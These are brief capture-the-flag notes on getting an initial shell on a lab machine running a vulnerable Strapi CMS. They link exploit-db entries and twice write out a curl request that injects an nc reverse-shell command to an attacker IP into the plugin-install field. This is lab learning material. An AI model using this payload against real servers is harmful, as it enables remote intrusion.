# Getting initial shell as strapi user
## Knowing strapi version running as CMS on http://horizontall.htb/
Got strapi version running as CMS on http://horizontall.htb/ on address http://api-prod.horizontall.htb/admin/init
![[Pasted image 20210910144351.png]]
## Found exploit for strapi version 3.0.0-beta.17.4 on exploit-db
Found exploit for strapi version 3.0.0-beta.17.4 on [exploit-db](https://www.exploit-db.com/exploits/50239).
## Executed above exploit to get Remote code execution on target system and getting reverse shell
![[Pasted image 20210910154320.png]]
## Other ways to get initial shell
### Set password for user exploit and getting JWT token via burp and then getting reverse shell via curl command 
* In this [exploit](https://www.exploit-db.com/exploits/50237), password for `admin`
user can be set and can be logged in as admin user on http://api-prod.horizontall.htb/admin .
* Then we can get JWT token while uploading file in 'Files Upload' section by intercepting request in burp.
* Then we can get reverse shell via this curl command `curl -i -s -k -X $'POST' -H $'Host: api-prod.horizontall.htb' -H $'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMxMzQ4OTU1LCJleHAiOjE2MzM5NDA5NTV9.cZRCsohwMC4ETPFaPuUwcaA4W7YSbUV6Cogm2SRrwj8' -H $'Content-Type: application/json' -H $'Origin: http://api-prod.horizontall.htb' -H $'Content-Length: 123' -H $'Connection: close' --data $'{\"plugin\":\"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.98 9000 >/tmp/f)\",\"port\":\"80\"}' $'http://api-prod.horizontall.htb/admin/plugins/install'`
### Getting JWT token via code on [website](https://thatsn0tmysite.wordpress.com/2019/11/15/x05/) and getting reverse shell via CURL
* We can get JWT token by running python script on [website](https://thatsn0tmysite.wordpress.com/2019/11/15/x05/) 
* Then we can get reverse shell via this curl command `curl -i -s -k -X $'POST' -H $'Host: api-prod.horizontall.htb' -H $'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMxMzQ4OTU1LCJleHAiOjE2MzM5NDA5NTV9.cZRCsohwMC4ETPFaPuUwcaA4W7YSbUV6Cogm2SRrwj8' -H $'Content-Type: application/json' -H $'Origin: http://api-prod.horizontall.htb' -H $'Content-Length: 123' -H $'Connection: close' --data $'{\"plugin\":\"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.98 9000 >/tmp/f)\",\"port\":\"80\"}' $'http://api-prod.horizontall.htb/admin/plugins/install'`

